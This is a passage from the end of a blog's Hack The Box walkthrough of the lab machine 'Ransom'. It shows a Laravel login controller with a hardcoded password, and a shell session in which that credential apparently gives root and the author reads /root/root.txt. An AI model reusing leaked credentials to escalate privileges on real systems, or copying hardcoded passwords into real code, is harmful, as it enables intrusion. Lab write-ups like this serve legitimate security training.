class="line"></span><br><span class="line"></span><br><span class="line">class AuthController extends Controller</span><br><span class="line">&#123;</span><br><span class="line">    /**</span><br><span class="line">     * Display login page.</span><br><span class="line">     * </span><br><span class="line">     * @<span class="built_in">return</span> \Illuminate\Http\Response</span><br><span class="line">     */</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">show_login</span></span>()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">return</span> view(<span class="string">&#x27;auth.login&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * Handle account login</span><br><span class="line">     * </span><br><span class="line">     */</span><br><span class="line">    public <span class="keyword">function</span> customLogin(Request <span class="variable">$request</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$request</span>-&gt;validate([</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;required&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$request</span>-&gt;get(<span class="string">&#x27;password&#x27;</span>) == <span class="string">&quot;UHC-March-Global-PW!&quot;</span>) &#123;</span><br><span class="line">            session([<span class="string">&#x27;loggedin&#x27;</span> =&gt; True]);</span><br><span class="line">            <span class="built_in">return</span> <span class="string">&quot;Login Successful&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">  </span><br><span class="line">        <span class="built_in">return</span> <span class="string">&quot;Invalid Password&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">htb@ransom:/srv/prod$ su root</span><br><span class="line">Password: </span><br><span class="line">root@ransom:/srv/prod<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@ransom:/srv/prod<span class="comment"># cat /root/root.txt </span></span><br><span class="line">93df............................</span><br><span class="line">root@ransom:/srv/prod<span class="comment"># </span></span><br></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Hack-The-Box/" class="category-chain-item">Hack The Box</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Linux/" class="print-no-link">#Linux</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>HTB Walkthrough - Ransom</div>
+      <div>https://crazyinside.github.io/post/HackTheBox-Ransom.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Crazyinside</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>August 14, 2023</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-RedCross.html" title="HTB Walkthrough - RedCross">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HTB Walkthrough - RedCross</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/HackTheBox-Quserier.html" title="HTB Walkthrough - Quserier">
+                        <span class="hidden-mobile">HTB Walkthrough - Quserier</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
